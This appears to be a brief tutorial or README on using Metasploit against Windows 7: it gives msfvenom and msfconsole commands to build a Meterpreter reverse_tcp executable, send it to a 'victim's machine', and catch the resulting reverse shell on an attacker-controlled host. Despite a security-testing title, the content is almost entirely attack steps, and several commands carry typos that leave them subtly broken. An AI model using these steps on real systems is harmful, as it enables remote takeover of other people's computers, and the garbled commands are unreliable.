# Metaspoilt
	Test the System Security of Windows 7  by using Metasploit Tool

# Creating payload for WIN 7x86 (32-bit)
	1. Open Kali Terminal.
		# apt-get update && apt-get update
	2. Creating PAYLOAD :
		# msfvenom p windows/meterpreter/reverse_tcp lhost=192.168.xxx.xxx -f exe -o <filename>.exe
	3. Send thi shell to victims' mchine.
	4. Run thr *.exe file.
# Reverse shell :
	1. Open Kali Teminal.
		# msfconsole
		msf6 > use multi/handler
		msf6 explloit (multi handler) > set payload windows/meterpreter/reverse_tcp
		msf6 explloit (multi handler) > set lhost 192.168.xxx.xxx
		msf6 explloit (multi handler) >exploit
	
# Huraah !! we did it : )
